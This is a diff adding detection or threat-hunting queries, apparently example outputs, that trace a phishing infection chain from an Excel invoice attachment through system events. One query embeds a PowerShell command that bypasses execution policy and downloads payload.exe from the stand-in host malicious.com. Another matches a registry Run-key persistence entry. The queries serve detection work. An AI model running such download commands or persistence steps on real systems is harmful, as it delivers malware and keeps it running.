@@ -1,0 +1,18 @@
+<output>
+subject: "Important Update" AND attachment: "Invoice_2023.xlsx"
+</output>
+<output>
+srcNode.Image: "excel.exe" AND srcNode.Cmdline: "*C:\\Users\\User\\Downloads\\Invoice_2023.xlsx /m*"
+</output>
+<output>
+srcNode.Image: "powershell.exe" AND srcNode.Cmdline: "*-ExecutionPolicy Bypass -Command \\"Invoke-WebRequest -Uri 'http://malicious.com/payload.exe' -OutFile 'C:\\Users\\User\\AppData\\Local\\Temp\\payload.exe'\\"*"
+</output>
+<output>
+srcNode.Image: "C:\\Users\\User\\AppData\\Local\\Temp\\payload.exe" AND relation: "Process Create"
+</output>
+<output>
+srcNode.Image: "reg.exe" AND dstNode.Key: "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+</output>
+<output>
+srcNode.Image: "powershell.exe" AND dstNode.Dstaddress: "external_ip"
+</output>
